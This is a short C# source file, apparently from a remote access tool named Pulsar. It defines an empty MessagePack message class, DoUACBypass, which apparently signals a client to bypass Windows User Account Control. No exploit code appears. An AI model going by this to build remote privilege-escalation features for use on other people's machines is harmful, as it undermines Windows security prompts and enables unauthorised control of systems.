﻿using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.ClientManagement.UAC
{
    [MessagePackObject]
    public class DoUACBypass : IMessage
    {
    }
}
